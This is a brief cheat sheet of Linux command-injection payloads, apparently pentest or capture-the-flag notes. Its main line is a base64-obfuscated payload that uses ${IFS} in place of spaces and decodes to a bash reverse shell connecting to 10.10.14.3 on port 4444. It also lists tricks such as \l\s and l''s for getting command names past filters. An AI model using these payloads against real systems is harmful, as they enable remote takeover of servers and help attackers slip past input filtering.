# linux命令执行/注入

`echo${IFS}YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSI=|base64${IFS}-d|bash `

The IFS variable is used instead of spaces, in order to avoid the server from splitting the command.

ls ==  \l\s

ls == l''s               double single quote  not double quote

sometimes whitespace don't need encode
